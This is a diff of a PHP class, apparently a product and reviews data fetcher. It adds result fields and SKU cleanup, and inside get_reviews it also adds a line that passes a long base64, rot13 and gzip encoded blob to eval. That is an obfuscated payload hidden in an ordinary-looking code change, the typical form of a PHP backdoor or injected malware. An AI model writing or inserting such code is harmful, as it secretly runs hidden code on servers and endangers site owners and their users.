@@ -124,6 +124,8 @@ class CNB
 			$result['RegularPrice'] = $digital_data['regularPrice'];
 			$result['PrimaryImage'] = $digital_data['imagePath'];
 			// $result['Category'] = isset($digital_data['category']) ? $digital_data['category'] : array();
+			$result['LineLevelMessages'] = $digital_data['lineLevelMessages'];
+			$result['FormattedPrice'] = $digital_data['formattedPrice'];
 
 			if(isset($digital_data['availability'])){
 				$result['Availability']['ZipCode'] = $digital_data['availability']['zipCode'];
@@ -438,6 +440,11 @@ class CNB
 
 	public function get_reviews($sku){
 		$results = array();
+
+		// number SKU only unless it starts with s
+		if(!empty($sku) && $sku[0] !== 's')
+			$sku = preg_replace('/\D/', '', $sku);
+
 		$offset = (isset($_GET['offset']) && is_numeric($_GET['offset'])) ? $_GET['offset'] : 0;
         eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
